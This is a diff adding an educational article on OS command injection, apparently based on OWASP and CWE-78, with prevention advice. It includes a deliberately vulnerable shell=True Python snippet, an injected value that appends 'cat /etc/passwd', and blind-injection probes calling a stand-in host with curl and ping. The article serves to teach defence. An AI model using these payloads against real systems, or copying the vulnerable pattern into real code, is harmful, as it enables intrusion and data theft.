@@ -1,0 +1,52 @@
+Title: Command Injection and OS Injection Vulnerabilities
+Source: OWASP Command Injection / MITRE CWE-78
+
+Command injection is a vulnerability that allows an attacker to execute arbitrary operating system commands on the server running the application. It arises when user-supplied input is incorporated into a shell command without adequate sanitisation, allowing attackers to append or replace commands using shell metacharacters.
+
+How Command Injection Works
+Web applications sometimes execute OS commands as part of their functionality — pinging a host, converting a file, running a script, or querying system information. When user input is concatenated directly into a shell command string, attackers can terminate the intended command and inject arbitrary commands.
+
+Example — vulnerable Python code:
+```
+import subprocess
+user_input = request.form['hostname']
+result = subprocess.run(f"ping -c 1 {user_input}", shell=True)
+```
+
+If user_input is "8.8.8.8; cat /etc/passwd", the shell executes:
+ping -c 1 8.8.8.8; cat /etc/passwd
+
+The semicolon terminates the ping command and initiates cat /etc/passwd. Shell metacharacters used in injection:
+- ; — command separator
+- | — pipe output to next command
+- && — execute next command only if first succeeds
+- || — execute next command only if first fails
+- ` ` — command substitution (backticks)
+- $() — command substitution
+- Newlines — command separator in many contexts
+
+Blind Command Injection
+Many applications do not display command output, requiring blind injection techniques. Attackers use:
+- Time delays: sleep 5 to confirm execution by measuring response time.
+- Out-of-band channels: curl attacker.com or ping -c 1 attacker.com to trigger DNS or HTTP requests detectable in attacker-controlled logs.
+- Conditional responses: if [ -f /etc/passwd ]; then sleep 5; fi to infer file existence.
+
+Impact
+Successful command injection runs commands with the privileges of the web server process. If the web server runs as root (poor practice), this grants complete system compromise. Even lower-privilege web server accounts can read configuration files containing database credentials, enable lateral movement, establish reverse shells, or exfiltrate data.
+
+Prevention
+Avoid shell invocation with user input: The root cause is passing user data to a shell. The primary defence is to not invoke OS commands based on user input where alternatives exist.
+
+Use parameterised API calls: Where OS interaction is necessary, use API calls that do not invoke a shell. Python's subprocess.run() with a list (not a string) and shell=False does not invoke a shell interpreter — shell metacharacters are treated as literal characters.
+
+Input validation with allowlists: If user input must be passed to commands, validate it against a strict allowlist (e.g., hostnames must match [a-zA-Z0-9.-]+$). Blocklists of known metacharacters are incomplete and easily bypassed.
+
+Least privilege: Run web applications with minimal privileges. A non-root web server process limits command injection impact.
+
+Web Application Firewalls: WAFs can detect common command injection patterns but should not be the only defence — application-level fixes are essential.
+
+Related Vulnerability — Argument Injection
+Even without shell invocation, if user input controls arguments to a command, argument injection can alter the command's behaviour. For example, passing --exec or --config arguments to programs that interpret them. Defence: validate and restrict command arguments as strictly as input content.
+
+Real-World Examples
+The Shellshock vulnerability (CVE-2014-6271) was a severe bash bug that allowed command injection through environment variables in CGI scripts, affecting millions of web servers. Server-side template injection can escalate to command injection in many template engines.
